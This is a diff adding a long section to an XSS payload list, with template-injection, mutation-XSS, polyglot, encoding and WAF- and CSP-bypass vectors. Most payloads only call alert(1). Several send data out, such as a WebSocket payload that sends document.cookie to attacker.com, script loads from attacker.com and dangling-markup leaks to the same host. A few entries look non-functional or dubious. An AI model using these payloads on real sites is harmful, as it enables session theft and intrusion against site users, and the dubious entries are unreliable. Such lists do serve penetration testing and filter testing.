@@ -541,3 +541,215 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 
 # SVG/HTML nesting XSS
 <svg></svg></iframe>
+
+# Modern XSS vectors and WAF bypasses
+
+# AngularJS template injection
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$parent.constructor('alert(1)')()}}
+<div ng-app ng-csp><div ng-controller="test">{{$eval.constructor('alert(1)')()}}</div></div>
+
+# VueJS template injection
+{{constructor.constructor('alert(1)')()}}
+{{_c.constructor('alert(1)')()}}
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+
+# React JSX injection
+<img src=x onerror={alert(1)} />
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
+
+# Mutation XSS (mXSS)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+<style><img src=x onerror=alert(1)></style>
+
+# DOM clobbering
+<form id=test><input id=test2></form><form id=test2><input id=test></form>
+<img name=alert id=alert src=x onerror=alert(1)>
+<form name=test><input id=attributes></form>
+
+# Polyglot XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+# HTML5 new tags
+<details open ontoggle=alert(1)>
+<details open ontoggle="alert(1)">
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>0</meter>
+<progress value=0 max=100 onmouseover=alert(1)>
+<dialog open onclose=alert(1)>
+<keygen onfocus=alert(1)>
+
+# WebSocket XSS
+<script>ws=new WebSocket('ws://attacker.com');ws.send(document.cookie);</script>
+
+# postMessage XSS
+<script>parent.postMessage('<img src=x onerror=alert(1)>','*')</script>
+<iframe src="javascript:parent.postMessage('<img src=x onerror=alert(1)>','*')">
+
+# Web Worker XSS
+<script>w=new Worker('data:text/javascript,postMessage(document.cookie)');</script>
+
+# Service Worker XSS
+<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>
+
+# CSS-based XSS
+<style>@import'data:text/css,body{background:url(javascript:alert(1))}';</style>
+<style>*{background:url('javascript:alert(1)')}</style>
+<link rel=stylesheet href='data:text/css,*{x:expression(alert(1))}'>
+
+# XML namespace XSS
+<html xmlns:xss>
+<?import namespace="xss" implementation="http://attacker.com/xss.htc"?>
+<xss:xss>test</xss:xss>
+
+# XSLT XSS
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:template match="/">
+<script>alert(1)</script>
+</xsl:template>
+
+# Unicode bypass
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<script>alert\u0028 1\u0029</script>
+\x3cscript\x3ealert(1)\x3c/script\x3e
+
+# Octal encoding
+\74\163\143\162\151\160\164\76alert(1)\74\57\163\143\162\151\160\164\76
+
+# Hex encoding
+\x3c\x73\x63\x72\x69\x70\x74\x3ealert(1)\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+
+# HTML entity encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+
+# Double encoding
+%253Cscript%253Ealert(1)%253C%2Fscript%253E
+
+# UTF-7 encoding
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# WAF bypass with comments
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# WAF bypass with null bytes
+<script\x00>alert(1)</script>
+<scri\x00pt>alert(1)</scri\x00pt>
+
+# WAF bypass with newlines
+<script
+>alert(1)</script>
+<scri\npt>alert(1)</scri\npt>
+
+# Obfuscated JavaScript
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+<script>[1].map(alert)</script>
+<script>top[/al/.source+/ert/.source](1)</script>
+
+# JSFuck
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
+
+# Content Security Policy bypass
+<link rel="prefetch" href="javascript:alert(1)">
+<link rel="prerender" href="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+
+# srcdoc iframe XSS
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+
+# HTML imports XSS
+<link rel="import" href="data:text/html,<script>alert(1)</script>">
+
+# Script gadgets
+<div id=x tabindex=1 onfocus=alert(1)></div><input value=clickme>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<video poster=javascript:alert(1)//></video>
+<body onload=alert(1)>
+<body oninput=alert(1)><input autofocus>
+
+# RPO (Relative Path Overwrite)
+<script src="//attacker.com/poc.js"></script>
+<script src="/poc.js"></script>
+
+# Dangling markup injection
+"><img src='//attacker.com?
+'><img src='//attacker.com?
+
+# AngularJS 1.6+ sandbox bypass
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
+
+# Template literals
+<script>eval(`alert\x281\x29`)</script>
+<script>Function`x${alert`1`}x`</script>
+
+# Arrow functions
+<script>_=alert,_(1)</script>
+<script>(alert)(1)</script>
+<script>[alert][0](1)</script>
+
+# ES6 features
+<script>({alert}={alert:alert},{alert}(1))</script>
+<script>[a,b,c,...alert]=1</script>
+
+# Event handlers with spaces
+< img src=x onerror=alert(1)>
+<img src=x onerror= alert(1)>
+<img src=x onerror = alert(1)>
+
+# Without quotes
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert(document.domain)>
+
+# Protocol-relative URL
+<script src=//attacker.com/xss.js></script>
+<img src=//attacker.com/x onerror=alert(1)>
+
+# Meta refresh XSS
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+
+# Form action XSS
+<form action="javascript:alert(1)"><input type=submit></form>
+<form><button formaction="javascript:alert(1)">Click</button></form>
+
+# Object data XSS
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+
+# Embed src XSS
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# Applet XSS
+<applet code="java.lang.Runtime">
+
+# Audio/Video XSS
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+
+# Picture XSS
+<picture><source srcset="javascript:alert(1)"></picture>
+
+# Track XSS
+<video><track default src="javascript:alert(1)"></video>
+
+# Shadow DOM XSS
+<div><template shadowroot=open><script>alert(1)</script></template></div>
+
+# Custom elements XSS
+<custom-element onconnected=alert(1)>
+
+# Web Components XSS
+<x-element><script>alert(1)</script></x-element>
